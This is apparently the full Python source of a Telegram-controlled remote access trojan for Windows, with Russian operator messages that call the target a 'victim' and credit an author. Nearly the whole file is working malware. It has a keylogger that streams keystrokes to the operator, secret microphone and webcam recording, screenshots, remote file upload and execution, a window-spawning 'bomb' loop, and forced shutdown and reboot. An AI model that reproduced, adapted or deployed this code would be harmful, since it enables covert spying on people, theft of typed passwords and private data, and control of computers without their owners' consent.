import telebot, os, random, pyttsx3, pyautogui, cv2, json, ctypes, base64, sqlite3, win32crypt
import time, stat, pyaudio, wave
import numpy as np
import shutil
from pynput import keyboard
from datetime import datetime, timedelta
from telebot import types
from gtts import gTTS
import os
import pygame
from telebot import TeleBot
import imageio_ffmpeg as ffmpeg
import cv2
import subprocess
import ffmpeg 

bot = telebot.TeleBot('YOUR-TOKEN')
sticker = 'CAACAgIAAxkBAAENzD1nsGyJMEXejeHdbQZ2u2NfHdzkZwACHwADDbbSGVMMqpEYFo4gNgQ'
sticker2 = 'CAACAgIAAxkBAAEN4oBnu6Ad5OTb2Z8LqL1I3LB-QBQTrgACSAMAAvPjvgs3pUbsiijoLzYE'
sticker3 = 'CAACAgIAAxkBAAEN72hnxMmSiLCn4v4pV1hUDXTZo4giJQACGkwAAg7dSEsZHXNr7iYBvzYE'
OWNER = "405412786"

def create_main_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    buttons = [
        types.InlineKeyboardButton("⌨️ Keylogger", callback_data="keylogger"),
        types.InlineKeyboardButton("🖱️ Crazy Mouse", callback_data="crazy"),
        types.InlineKeyboardButton("🎤 Micro", callback_data="micro"),
        types.InlineKeyboardButton("💣 Bomb Out", callback_data="bomb"),
        types.InlineKeyboardButton("📁 Upload File", callback_data="file"),
        types.InlineKeyboardButton("🚀 Run File", callback_data="run"),
        types.InlineKeyboardButton("🖼️ Changle wallpeper", callback_data="wallpaper"),
        types.InlineKeyboardButton("🔊 Full Volume", callback_data="fullvolume"),
        types.InlineKeyboardButton("🗣️ Speaker", callback_data="textspech"),
        types.InlineKeyboardButton("🎵 Play Sound", callback_data="playsound"),
        types.InlineKeyboardButton("🌐 Open Link", callback_data="link"),
        types.InlineKeyboardButton("📹 Webcam", callback_data="webcam"),
        types.InlineKeyboardButton("📸 Screen", callback_data="shot"),
        types.InlineKeyboardButton("😴 Sleep", callback_data="sleep"),
        types.InlineKeyboardButton("🔌 Power Off", callback_data="shutdown"),
        types.InlineKeyboardButton("🔄 Reboot", callback_data="restart")
    ]
    for button in buttons:
        markup.add(button)
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    if str(message.from_user.id) == OWNER:
        bot.send_sticker(message.chat.id, sticker)
        name = f'{message.from_user.first_name} {message.from_user.last_name}' if message.from_user.last_name else message.from_user.first_name
        safe_name = name.replace('-', '\-').replace('!', '\!').replace('.', '\.').replace('(', '$').replace(')', '$').replace('_', '\_')

        text = (
            f"*Привет, {safe_name}\! Все работает \- жертва на крючке :\)\n"
            "Создано с любовью [@suggika](https://t\\.me/suggika) для [@totem](https://t\\.me/TotemKmBot)\n"
            "Прежде чем начать задавать кучу вопросов прочти руководство для чайников в [@totem](https://t\\.me/TotemKmBot) \- там как раз всё про ратку и не только :\)\n\n"
            "Мой [GitHub](https://github\\.com/Suggika)*"
        )

        bot.send_message(
            message.chat.id, 
            text,
            parse_mode='MarkdownV2',
            reply_markup=create_main_keyboard()
        )
        bot.send_sticker(message.chat.id, sticker3)
        result = os.popen('whoami').read().strip()
    else:
        bot.send_message(message.chat.id, 'Пошел нахуй!')
        

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == "keylogger":
        track_all_keys(call.message)
    elif call.data == "mousekill":
        mous(call.message)
    elif call.data == "mess":
        mous(call.message)
    elif call.data == "micro":
        record_audio(call.message)
    elif call.data == "bomb":
        cmdbomb(call.message)
    elif call.data == "file":
        handle_upload_command(call.message)
    elif call.data == "wallpaper":
        wallpaper(call.message)
    elif call.data == "fullvolume":
        volp(call.message)
    elif call.data == "textspech":
        bot.send_message(call.message.chat.id, "Набери текст:")
        bot.register_next_step_handler(call.message, process_text_to_speech)
    elif call.data == "playsound":
        bot.send_message(call.message.chat.id, "Кинь путь к файлу:")
        bot.register_next_step_handler(call.message, process_playsound)
    elif call.data == "link":
        bot.send_message(call.message.chat.id, "Кинь сюда ссылку:")
        bot.register_next_step_handler(call.message, process_link)
    elif call.data == "webcam":
        take_video(call.message)
    elif call.data == "shot":
        take_screenshot(call.message)
    elif call.data == "sleep":
        sleep(call.message)
    elif call.data == "shutdown":
        shutdown(call.message)
    elif call.data == "restart":
        restart(call.message)
    
    bot.answer_callback_query(call.id)

def process_text_to_speech(message):
    text_message = message
    text_message.text = f"/textspech {message.text}"
    text_to_speech(text_message)

def process_playsound(message):
    sound_message = message
    sound_message.text = f"/playsound {message.text}"
    plsound(sound_message)

def process_link(message):
    link_message = message
    link_message.text = f"/link {message.text}"
    open_link(link_message)

global keylogger_active
keylogger_active = {}
keylogger_messages = {}

@bot.callback_query_handler(func=lambda call: call.data == "stop_keylogger")
def stop_keylogger_callback(call):
    chat_id = call.message.chat.id
    if chat_id in keylogger_active:
        keylogger_active[chat_id] = False
        listener = False
        if chat_id in keylogger_messages:
            del keylogger_messages[chat_id]
        bot.delete_message(chat_id=chat_id, message_id=call.message.message_id)
        try:
            bot.delete_message(chat_id=chat_id, message_id=call.message.message_id-1)
        except Exception:
            pass
            
        # Отправляем сообщение об остановке логгера
        bot.send_message(chat_id, "Логгер остановлен!")
    bot.answer_callback_query(call.id)

@bot.message_handler(commands=['keylogger'])
def track_all_keys(message):
    try:
        chat_id = message.chat.id
        
        markup = types.InlineKeyboardMarkup()
        stop_button = types.InlineKeyboardButton("❌", callback_data="stop_keylogger")
        markup.add(stop_button)
        
        bot.send_sticker(chat_id, sticker)
        sent_message = bot.send_message(chat_id, "Как надоест нажми крестик, а пока ждем первых сообщений от жертвы :)", reply_markup=markup)
        
        keylogger_active[chat_id] = True
        keylogger_messages[chat_id] = {
            "message_id": sent_message.message_id,
            "text": ""
        }
        
        first_input = True
        
        def on_press(key):
            if chat_id in keylogger_active and keylogger_active[chat_id]:
                nonlocal first_input
                
                try:
                    if first_input:
                        keylogger_messages[chat_id]["text"] = ""
                        first_input = False
                    
                    keylogger_messages[chat_id]["text"] += key.char
                except AttributeError:
                    key_name = str(key).replace("Key.", "")
                    
                    if key_name in ["shift", "shift_r", "shift_l", "caps_lock", "cmd", "cmd_r", "cmd_l", 
                                   "ctrl", "ctrl_r", "ctrl_l", "alt", "alt_r", "alt_l", "delete", "tab"] or \
                       key_name.startswith("f") and key_name[1:].isdigit() and 1 <= int(key_name[1:]) <= 12:
                        return True
                    
                    if first_input and key_name in ["space", "enter", "backspace"]:
                        keylogger_messages[chat_id]["text"] = ""
                        first_input = False
                    
                    if key_name == "space":
                        keylogger_messages[chat_id]["text"] += " "
                    elif key_name == "enter":
                        keylogger_messages[chat_id]["text"] += "\n"
                    elif key_name == "backspace":
                        keylogger_messages[chat_id]["text"] = keylogger_messages[chat_id]["text"][:-1]
                    else:
                        keylogger_messages[chat_id]["text"] += f"[{key_name}]"
                
                try:
                    bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=keylogger_messages[chat_id]["message_id"],
                        text=keylogger_messages[chat_id]["text"] if keylogger_messages[chat_id]["text"] else "",
                        reply_markup=markup
                    )
                except Exception:
                    pass
            return True

        def on_release(key):
            if chat_id not in keylogger_active or not keylogger_active[chat_id]:
                return False
            return True

        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        bot.send_message(chat_id, f'Ошибка: {e}')

global crazy
crazy = False

@bot.message_handler(commands=['crazy'])
def mous(message):
    try:
        global crazy
        crazy = True
        
        markup = types.InlineKeyboardMarkup()
        stop_button = types.InlineKeyboardButton("❌", callback_data="stop_crazy")
        markup.add(stop_button)
        
        bot.send_sticker(message.chat.id, sticker)
        bot.send_message(message.chat.id, "Как станет жалко нажми на крестик нажми на крестик :)")
        
        
        while crazy:
            x = random.randint(666, 999)
            y = random.randint(666, 999)
            pyautogui.moveTo(x, y, 7)
            time.sleep(1)
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка: {e}')

@bot.callback_query_handler(func=lambda call: call.data == "stop_crazy")
def stop_crazy_callback(call):
    global crazy
    crazy = False
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                         text="Курсор спасен!")
    bot.answer_callback_query(call.id)

@bot.message_handler(commands=['keytype'])
def keytyp(message):
    try:
        text = message.text.split('/keytype' , 1)[1].strip()
        pyautogui.write(text)
        bot.send_sticker(message.chat.id, sticker)
    except Exception as e:
        bot.send_message(message.chat.id , f'Ошибка:{e}')

@bot.message_handler(commands=['micro'])
def record_audio(message):
    try:
        if len(message.text.split()) > 1:
            try:
                record_time = int(message.text.split()[1]) 
            except ValueError:
                bot.reply_to(message, "Ебанат?")
                return
        else:
            record_time = 5

        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        WAVE_OUTPUT_FILENAME = "rat.wav"

        p = pyaudio.PyAudio()
        
        bot.send_sticker(message.chat.id, sticker2)
        
        try:
            stream = p.open(format=FORMAT, 
                           channels=CHANNELS, 
                           rate=RATE, 
                           input=True, 
                           frames_per_buffer=CHUNK)
            
            frames = []
            
            for i in range(0, int(RATE / CHUNK * record_time)):
                data = stream.read(CHUNK, exception_on_overflow=False)
                frames.append(data)
                
            stream.stop_stream()
            stream.close()
            
        except Exception as e:
            p.terminate()
            bot.send_message(message.chat.id, f"Ошибка при записи аудио: {e}")
            return
            
        p.terminate()
        
        with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
        
        if os.path.exists(WAVE_OUTPUT_FILENAME) and os.path.getsize(WAVE_OUTPUT_FILENAME) > 0:
            with open(WAVE_OUTPUT_FILENAME, 'rb') as audio_file:
                bot.send_audio(message.chat.id, audio_file)
            bot.send_sticker(message.chat.id, sticker)
        else:
            bot.send_message(message.chat.id, "К сожалению записать аудио не вышло :( Возможно, у жертвы выключен микрофон.")
            
        if os.path.exists(WAVE_OUTPUT_FILENAME):
            os.remove(WAVE_OUTPUT_FILENAME)
            
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка при записи: {e}")

@bot.message_handler(commands=['bomb'])
def cmdbomb(message):
    try:
        global bombing_active
        bombing_active = True
        
        markup = types.InlineKeyboardMarkup()
        stop_button = types.InlineKeyboardButton(text="❌", callback_data="stop_bombing")
        markup.add(stop_button)
        
        bot.send_sticker(message.chat.id, sticker)
        bot.send_message(message.chat.id, "Когда станет жалко нажми на крестик :)", reply_markup=markup)
        
        while bombing_active:
            os.popen('start cmd')
            os.popen('start taskmgr')
            os.popen('start regedit')
            os.popen('start ms-settings:')
            
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка: {e}')

@bot.callback_query_handler(func=lambda call: call.data == "stop_bombing")
def stop_bombing(call):
    global bombing_active
    bombing_active = False
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, 
                         text="Бомбежка остановлена!", reply_markup=None)
    bot.send_sticker(call.message.chat.id, sticker)

waiting_for_upload = False

@bot.message_handler(commands=['file'])
def handle_upload_command(message):
    global waiting_for_upload
    waiting_for_upload = True
    bot.send_message(message.chat.id, "Пожалуй самая обширная функция, развязывающая тебе руки :) Жду от тебя любой файл который ты хочешь грузануть на пк жертвы.")

@bot.message_handler(content_types=['document', 'photo', 'audio', 'video', 'voice'])
def handle_file(message):
    global waiting_for_upload
    if waiting_for_upload:
        try:
            if message.document:
                file_name = message.document.file_name
                file_info = bot.get_file(message.document.file_id)
            elif message.photo:
                file_name = message.photo[-1].file_name
                file_info = bot.get_file(message.photo[-1].file_id)
            elif message.audio:
                file_name = message.audio.file_name if message.audio.file_name else 'audio.mp3'
                file_info = bot.get_file(message.audio.file_id)
            else:
                bot.send_message(message.chat.id, 'Формат файла не поддерживается.')
                return
            
            downloaded_file = bot.download_file(file_info.file_path)
            with open(file_name, 'wb') as new_file:
                new_file.write(downloaded_file)
            directory = os.getcwd() 
            sent_message = bot.send_message(message.chat.id, f'Файл сохранен сюда ->{directory}')
            bot.pin_chat_message(message.chat.id, sent_message.message_id)
            
            waiting_for_upload = False
        except Exception as e:
            bot.send_message(message.chat.id, f'Ошибка: {e}')
    else:
        bot.send_message(message.chat.id, 'Команду используй!')

@bot.message_handler(commands=['run'])
def startfile(message):
    try:
        file = message.text.split('/run' , 1)[1].strip()
        os.popen(f'start {str(file)}')
        bot.send_sticker(message.chat.id, sticker)
    except Exception as e:
        bot.send_message(message.chat.id , f'Ошибка:{e}')

@bot.message_handler(commands=['wallpaper'])
def wallpaper(message):
    bot.send_message(message.chat.id, "Жду фото :)")
    bot.register_next_step_handler(message, wall)
    
def wall(message):
    filename = message.text
    if not filename.startswith('/'):
        try:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(str(filename)), 0)
            bot.send_sticker(message.chat.id, sticker)
        except Exception as e:
            bot.send_message(message.chat.id, f'Ошибка{e}')

@bot.message_handler(commands=['fullvolume'])
def volp(message):
    try:
        for _ in range(70):
            pyautogui.press('volumeup')
        bot.send_sticker(message.chat.id, sticker)
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка: {e}')

@bot.message_handler(commands=['textspech'])
def text_to_speech(message):
    try:
        text = message.text.split(' ', 1)[1].strip()
    except IndexError:
        bot.reply_to(message, "Если че нужно использовать текст, а не просто так команду тыкать.")
        return

    engine = pyttsx3.init()
    voices = engine.getProperty('voices')
    
    russian_voices = [v for v in voices if 'ru' in v.id.lower() or 'russian' in v.name.lower()]
    
    if russian_voices:
        engine.setProperty('voice', russian_voices[0].id)
        engine.setProperty('rate', 150)
        engine.setProperty('volume', 0.9)
        
        audio_file = "speech.wav"
        engine.save_to_file(text, audio_file)
        engine.runAndWait()
    else:
        audio_file = "speech.mp3"
        tts = gTTS(text=text, lang='ru')
        tts.save(audio_file)
    
    try:
        pygame.mixer.init()
        pygame.mixer.music.load(audio_file)
        pygame.mixer.music.play()
        
        while pygame.mixer.music.get_busy():
            pygame.time.Clock().tick(10)
        
        pygame.mixer.quit()
        bot.send_sticker(message.chat.id, sticker)
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка при воспроизведении: {e}")

    if os.path.exists(audio_file):
        os.remove(audio_file)
@bot.message_handler(commands=['playsound'])
def plsound(message):
    try:
        muspath = message.text.split('/playsound', 1)[1].strip()
        os.popen(f'start "" "{muspath}"')
        bot.send_sticker(message.chat.id, sticker)
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка: {e}')

@bot.message_handler(commands=['link'])
def open_link(message):
    try:
        site = message.text.split('/link', 1)[1].strip()
        
        browsers = []
        
        if os.path.exists("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe") or \
           os.path.exists("C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"):
            browsers.append("chrome")
            
        if os.path.exists("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe") or \
           os.path.exists("C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"):
            browsers.append("msedge")
            
        if os.path.exists("C:\\Program Files\\Mozilla Firefox\\firefox.exe") or \
           os.path.exists("C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe"):
            browsers.append("firefox")
        
        if not browsers:
            os.popen(f'start "" "{site}"')
        else:
            import random
            browser = random.choice(browsers)
            os.popen(f'start {browser} "{site}"')
            
        bot.send_sticker(message.chat.id, sticker)
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка: {e}')

@bot.message_handler(commands=['webcam'])
def take_video(message):
    try:
        bot.send_message(message.chat.id, "Начинаю запись с камеры...")
        video_path = 'rat.mp4'
        fps = 30
        duration = 15

        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            for i in range(1, 10):
                try:
                    cap = cv2.VideoCapture(i)
                    if cap.isOpened():
                        break
                except Exception:
                    continue

        if cap.isOpened():
            width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
            height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            out = cv2.VideoWriter(video_path, fourcc, fps, (width, height))

            frames_captured = 0
            start_time = time.time()
            while time.time() - start_time < duration:
                try:
                    ret, frame = cap.read()
                    if ret:
                        out.write(frame)
                        frames_captured += 1
                    else:
                        time.sleep(0.1)
                except Exception:
                    time.sleep(0.1)
                    continue

            cap.release()
            out.release()
            
            if frames_captured == 0:
                raise Exception("Не удалось захватить ни одного кадра с камеры")
                
        else:
            os.environ['OPENCV_LOG_LEVEL'] = 'ERROR'
            
            ffmpeg_exe = "ffmpeg"
            
            possible_paths = [
                os.path.join(os.environ.get('PROGRAMFILES', ''), 'ffmpeg', 'bin', 'ffmpeg.exe'),
                os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), 'ffmpeg', 'bin', 'ffmpeg.exe'),
                os.path.join(os.getcwd(), 'ffmpeg.exe')
            ]
            
            for path in possible_paths:
                if os.path.exists(path):
                    ffmpeg_exe = f'"{path}"'
                    break

            capture_cmd = (
                f"{ffmpeg_exe} -f dshow -i video=\"Integrated Camera\" "
                f"-t {duration} -r {fps} \"{video_path}\" -y"
            )
            result = subprocess.run(capture_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            if result.returncode != 0:
                capture_cmd = (
                    f"{ffmpeg_exe} -f dshow -i video=\"USB Video Device\" "
                    f"-t {duration} -r {fps} \"{video_path}\" -y"
                )
                result = subprocess.run(capture_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
            if result.returncode != 0:
                capture_cmd = (
                    f"{ffmpeg_exe} -f dshow -list_devices true -i dummy"
                )
                devices_output = subprocess.run(capture_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                
                camera_name = None
                for line in devices_output.stderr.split('\n'):
                    if "dshow" in line and "video" in line.lower() and "alternative name" in line.lower():
                        parts = line.split('"')
                        if len(parts) >= 2:
                            camera_name = parts[1]
                            break
                
                if camera_name:
                    capture_cmd = (
                        f"{ffmpeg_exe} -f dshow -i video=\"{camera_name}\" "
                        f"-t {duration} -r {fps} \"{video_path}\" -y"
                    )
                    subprocess.run(capture_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if os.path.exists(video_path) and os.path.getsize(video_path) > 0:
            with open(video_path, 'rb') as video_file:
                bot.send_video(message.chat.id, video_file)
            os.remove(video_path)
        else:
            bot.send_message(message.chat.id, "К сожалению либо у жертвы нет вебки либо она у него заблокирована. Возможно, проблема с моей стороны - в этом случае я буду работать над этим.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка при записи с вебки: {e}")

@bot.message_handler(commands=['shot'])
def take_screenshot(message):
    try:
        screenshot_path = 'screenshot.png'
        pyautogui.screenshot(screenshot_path)
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
        os.remove(screenshot_path)
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка: {e}")

current_directory = os.getcwd()

@bot.message_handler(commands=['sleep'])
def sleep(message):
    try:
        ctypes.windll.PowrProf.SetSuspendState(0, 1, 0)
        bot.send_sticker(message.chat.id, sticker)
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка: {e}")

@bot.message_handler(commands=['shutdown'])
def shutdown(message):
    try:
        os.system('shutdown /s /f /t 0')
        bot.send_sticker(message.chat.id, sticker)
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка: {e}')

@bot.message_handler(commands=['restart'])
def restart(message):
    try:
        os.system('shutdown /r /f /t 0')
        bot.send_sticker(message.chat.id, sticker)
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка: {e}')

if __name__ == "__main__":
    bot.infinity_polling(none_stop=True)
